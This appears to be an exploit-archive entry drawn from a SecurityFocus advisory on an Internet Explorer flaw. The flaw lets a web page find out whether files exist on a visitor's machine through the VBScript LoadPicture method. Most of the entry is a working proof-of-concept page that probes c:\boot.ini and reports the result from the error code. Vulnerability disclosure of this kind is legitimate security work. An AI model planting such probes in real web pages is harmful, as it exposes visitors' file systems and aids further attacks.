@@ -1,0 +1,35 @@
+source: http://www.securityfocus.com/bid/9611/info
+
+Microsoft Internet Explorer is prone to an issue that may permit a remote site to enumerate the existence of files on the client system. 
+
+This may be exploited via abuse of the VBScript LoadPicture method. Exploitation of the weakness may assist in other attacks which depend on the attacker being able to determine whether or not certain files on the system exist.
+
+<form onsubmit="doIt(this);return false">
+<input name="filename" value="c:\boot.ini" size="80" type="text"><input type="submit">
+</form>
+
+<script language="vbscript">
+
+Sub loadIt(filename)
+LoadPicture(filename)
+End Sub
+
+</script>
+
+<script language="javascript">
+
+function doIt(form) {
+
+try {
+loadIt(form.filename.value);
+} catch(e) {
+result = e.number;
+}
+
+if (result != -2146827856) {
+alert('file exists');
+} else {
+alert('file does not exist');
+}
+}
+</script>
